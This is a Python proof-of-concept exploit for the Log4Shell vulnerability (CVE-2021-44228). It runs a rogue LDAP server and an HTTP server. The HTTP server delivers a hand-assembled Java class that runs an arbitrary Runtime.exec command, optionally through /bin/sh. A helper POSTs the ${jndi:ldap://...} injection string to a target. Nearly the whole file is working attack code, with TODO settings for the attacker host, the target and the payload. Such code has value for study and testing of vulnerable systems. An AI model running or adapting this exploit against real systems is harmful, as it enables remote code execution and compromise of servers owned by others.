"""
Pure Vanilla Python3 PoC for CVE-2021-44228.

alexandre-lavoie
"""

### Imports ###

import http.client
import http.server
import logging
import multiprocessing
import socket
import socketserver
import struct
import time
import urllib.parse
from typing import Dict, Tuple, Union, Literal

### Settings ###

# TODO: Set to your local configuration.
LHOST: str = "127.0.0.1"
LDAP_PORT: int = 1387
WEB_PORT: int = 1337
LDAP_URL: str = f"ldap://{LHOST}:{LDAP_PORT}"
CODEBASE_URL: str = f"http://{LHOST}:{WEB_PORT}/"

# TODO: Set to Target class/OS. 
# - Linux will encapsulate your payload in `/bin/sh -c ...`.
TARGET: Literal["Linux", "Any"] = "Any"

# TODO: Set to class name being run (default to Exploit).
CLASS_NAME: str = "Exploit"

# TODO: Set Runtime.exec payload.
PAYLOAD: str = """chromium"""

# TODO: Set to True if you want to automatically run the `send_juni` method.
RAUTO: bool = False

### Automation ###

LDAP_PAYLOAD: str = f"${{jndi:{LDAP_URL}/Log4RCE}}"
def send_juni():
    # Modify this method to perform your own automatic juni request.
    # - This is a simple POST request injection.

    RHOST: str = "127.0.0.1"
    RPORT: str = 8080

    logging.info(f"Sent payload to http://{RHOST}:{RPORT}/")

    if False:
        conn = http.client.HTTPSConnection(RHOST, RPORT)
    else:
        conn = http.client.HTTPConnection(RHOST, RPORT)

    post_data = f"address={LDAP_PAYLOAD}"
    conn.request("POST", "/", post_data, {"Content-Type": "application/x-www-form-urlencoded"})

### PoC ###

# Add your `.class` bytes here. It can be select through the `TARGET` variable.
# - Use an 2-size array if you want to inject the payload.
# - Use a byte-string if you want to run the java code directly.
JAVA_CLASSES: Dict[str, Union[Tuple[str, str], bytes]] = {
    "Linux": (
        b"\xca\xfe\xba\xbe\x00\x00\x00<\x00#\n\x00\x02\x00\x03\x07\x00\x04\x0c\x00\x05\x00\x06\x01\x00\x10java/lang/Object\x01\x00\x06<init>\x01\x00\x03()V\n\x00\x08\x00\t\x07\x00\n\x0c\x00\x0b\x00\x0c\x01\x00\x11java/lang/Runtime\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x07\x00\x0e\x01\x00\x10java/lang/String\x08\x00\x10\x01\x00\x07/bin/sh\x08\x00\x12\x01\x00\x02-c\x08\x00\x14",
        b'\n\x00\x08\x00\x16\x0c\x00\x17\x00\x18\x01\x00\x04exec\x01\x00(([Ljava/lang/String;)Ljava/lang/Process;\x07\x00\x1a\x01\x00\x13java/lang/Exception\x07\x00\x1c\x01\x00\x07Exploit\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x08<clinit>\x01\x00\rStackMapTable\x01\x00\nSourceFile\x01\x00\x0cExploit.java\x00!\x00\x1b\x00\x02\x00\x00\x00\x00\x00\x02\x00\x01\x00\x05\x00\x06\x00\x01\x00\x1d\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x1e\x00\x00\x00\x06\x00\x01\x00\x00\x00\x01\x00\x08\x00\x1f\x00\x06\x00\x01\x00\x1d\x00\x00\x00T\x00\x05\x00\x01\x00\x00\x00\x1f\xb8\x00\x07\x06\xbd\x00\rY\x03\x12\x0fSY\x04\x12\x11SY\x05\x12\x13S\xb6\x00\x15W\xa7\x00\x04K\xb1\x00\x01\x00\x00\x00\x1a\x00\x1d\x00\x19\x00\x02\x00\x1e\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x04\x00\x1a\x00\x05\x00\x1e\x00\x06\x00 \x00\x00\x00\x07\x00\x02]\x07\x00\x19\x00\x00\x01\x00!\x00\x00\x00\x02\x00"'
    ),
    "Any": (
        b"\xca\xfe\xba\xbe\x00\x00\x00<\x00\x1d\n\x00\x02\x00\x03\x07\x00\x04\x0c\x00\x05\x00\x06\x01\x00\x10java/lang/Object\x01\x00\x06<init>\x01\x00\x03()V\n\x00\x08\x00\t\x07\x00\n\x0c\x00\x0b\x00\x0c\x01\x00\x11java/lang/Runtime\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x08\x00\x0e",     
        b"\n\x00\x08\x00\x10\x0c\x00\x11\x00\x12\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\x07\x00\x14\x01\x00\x13java/lang/Exception\x07\x00\x16\x01\x00\x07Exploit\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x08<clinit>\x01\x00\rStackMapTable\x01\x00\nSourceFile\x01\x00\x0cExploit.java\x00!\x00\x15\x00\x02\x00\x00\x00\x00\x00\x02\x00\x01\x00\x05\x00\x06\x00\x01\x00\x17\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x18\x00\x00\x00\x06\x00\x01\x00\x00\x00\x01\x00\x08\x00\x19\x00\x06\x00\x01\x00\x17\x00\x00\x00C\x00\x02\x00\x01\x00\x00\x00\x0e\xb8\x00\x07\x12\r\xb6\x00\x0fW\xa7\x00\x04K\xb1\x00\x01\x00\x00\x00\t\x00\x0c\x00\x13\x00\x02\x00\x18\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x04\x00\t\x00\x05\x00\r\x00\x06\x00\x1a\x00\x00\x00\x07\x00\x02L\x07\x00\x13\x00\x00\x01\x00\x1b\x00\x00\x00\x02\x00\x1c"
    )
}

class Serializer():
    """
    Stack-based Serialization utility.
    """

    __payload: bytes
    __size_stack: bytes

    def __init__(self):
        self.__payload = b""
        self.__size_stack = []

    def push(self, data: bytes) -> "Serializer":
        self.__last = data
        self.__payload = data + self.__payload
        return self

    def pop_size(self) -> "Serializer":
        return self.push(bytes([len(self.__payload) - self.__size_stack.pop()]))

    def push_size(self, count=1) -> "Serializer":
        for _ in range(count):
            self.__size_stack.append(len(self.__payload))

        return self

    def build(self) -> bytes:
        return self.__payload

    def __repr__(self) -> str:
        return str(self.__payload)

class LDAPResponse():
    """
    Builder for LDAP query response.
    """

    __query_name: str
    __attributes: dict

    def __init__(self, query_name: str, attributes: dict):
        self.__query_name = query_name
        self.__attributes = attributes

    def serialize(self) -> bytes:
        s = Serializer()
        s.push_size(2)
        for k, v in reversed(self.__attributes.items()):
            s.push_size(3).push(v.encode()).pop_size().push(b"\x04").pop_size().push(b"1")
            s.push_size().push(k.encode()).pop_size().push(b"\x04").pop_size().push(b"0")

        s.push(b"0\x81\x82")
        s.push_size().push(self.__query_name.encode()).pop_size().push(b"\x04").pop_size()
        s.push(b"\x02\x01\x02d\x81").pop_size().push(b"0\x81")

        SUCCESS_RESPONSE = b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
        return s.build() + SUCCESS_RESPONSE

class LDAPHandler(socketserver.BaseRequestHandler):
    """
    Malicious query handler.
    """

    def handle(self):
        handshake = self.request.recv(8096)
        self.request.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")

        time.sleep(0.5)

        query = self.request.recv(8096)

        if len(query) < 10:
            return

        query_name = query[9:9+query[8:][0]].decode()

        response = LDAPResponse(query_name, {
            "javaClassName": "foo", 
            "javaCodeBase": CODEBASE_URL, 
            "objectClass": "javaNamingReference", 
            "javaFactory": CLASS_NAME
        })
        self.request.sendall(response.serialize())

        time.sleep(0.5)

        acknowledge = self.request.recv(8096)

def ldap():
    with socketserver.TCPServer((LHOST, LDAP_PORT), LDAPHandler) as server:
        server.serve_forever()

def build_class(cls, payload):
    tag = b"\x01" + struct.pack("!H", len(payload))
    return cls[0] + tag + payload.encode() + cls[1]

class WebHandler(http.server.BaseHTTPRequestHandler):
    """
    Malicious fetch handler.
    """

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "application/octet-stream")
        self.end_headers()

        if TARGET in JAVA_CLASSES:
            java_class = JAVA_CLASSES[TARGET]
        else:
            java_class = JAVA_CLASSES["Any"]

        if isinstance(java_class, tuple):
            output = build_class(java_class, PAYLOAD)
        else:
            output = java_class

        self.wfile.write(output)

def web():
    with http.server.HTTPServer((LHOST, WEB_PORT), WebHandler) as server:
        server.serve_forever()

def log4shell():
    logging.info(f"Python Log4RCE by alexandre-lavoie")
    logging.info(f"LDAP -> {LDAP_URL}")
    ldap_process = multiprocessing.Process(target=ldap)
    ldap_process.start()

    logging.info(f"HTTP -> {CODEBASE_URL}")
    web_process = multiprocessing.Process(target=web)
    web_process.start()

    time.sleep(1)

    if RAUTO:
        send_juni()
    else:
        logging.info(f"JUNI -> {LDAP_PAYLOAD}")
        input("Press enter to exit.\n")

    time.sleep(1)

    ldap_process.kill()
    web_process.kill()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    log4shell()
